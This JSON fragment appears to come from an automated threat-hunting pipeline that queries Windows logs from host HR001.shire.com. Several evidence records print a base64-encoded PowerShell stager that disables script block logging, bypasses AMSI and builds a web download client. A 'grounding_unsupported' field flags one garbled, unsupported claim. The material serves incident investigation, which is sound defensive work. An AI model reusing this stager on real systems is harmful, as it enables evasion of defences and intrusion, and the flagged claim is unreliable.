AuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQ \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "What are the network connections made by the powershell.exe process at 2019-05-14T22:32:23Z on host HR001.shire.com?",
        "evidence": "No matching records found for: What are the network connections made by the powershell.exe process at 2019-05-14T22:32:23Z on host HR001.shire.com?"
      },
      {
        "question": "What was the username associated with the powershell.exe process execution on host HR001.shire.com at 2019-05-14T22:32:23Z?",
        "evidence": "No matching records found for: What was the username associated with the powershell.exe process execution on host HR001.shire.com at 2019-05-14T22:32:23Z?"
      },
      {
        "question": "What were the logon events on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?",
        "evidence": "8 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:31:26.896Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:31:26.896Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:31:27.010Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:31:27.010Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:31:32.622Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:31:36.878Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:32:04.298Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}, {\"TimeCreated\": \"2019-05-14T22:32:31.950Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"4624\"}]"
      },
      {
        "question": "What is the parent process and the user account associated with the powershell.exe execution on HR001.shire.com at 2019-05-14T22:32:23Z?",
        "evidence": "No matching records found for: What is the parent process and the user account associated with the powershell.exe execution on HR001.shire.com at 2019-05-14T22:32:23Z?"
      },
      {
        "question": "What is the parent process, command line of the parent, and the user account for the powershell.exe execution on HR001.shire.com between 2019-05-14T22:32:20Z and 2019-05-14T22:32:30Z?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:23.415Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACA \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "Are there any Windows Service start/stop or configuration change events on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?",
        "evidence": "8 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:31:32.685Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k wsappx -p -s AppXSvc\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\SYSTEM\"}, {\"TimeCreated\": \"2019-05-14T22:31:34.069Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k LocalServiceNetworkRestricted\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\LOCAL SERVICE\"}, {\"TimeCreated\": \"2019-05-14T22:31:34.869Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k LocalService -p -s BthAvctpSvc\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\LOCAL SERVICE\"}, {\"TimeCreated\": \"2019-05-14T22:31:36.926Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs -p\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\SYSTEM\"}, {\"TimeCreated\": \"2019-05-14T22:31:57.483Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s gpsvc\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\SYSTEM\"}, {\"TimeCreated\": \"2019-05-14T22:32:04.333Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs -p\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\SYSTEM\"}, {\"TimeCreated\": \"2019-05-14T22:32:05.616Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\sppsvc.exe\", \"CommandLine\": \"C:\\\\Windows\\\\system32\\\\sppsvc.exe\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\NETWORK SERVICE\"}, {\"TimeCreated\": \"2019-05-14T22:32:31.991Z\", \"Computer\": \"HR001.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs -p\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\", \"User\": \"NT AUTHORITY\\\\SYSTEM\"}]"
      }
    ],
    "grounding_rounds": 2,
    "grounding_unsupported": [
      "hosted at 1x.0.0/Windows NT 6.1; WOW64; Trident/7.0"
    ],
    "zero_evidence_rounds": 0
  },
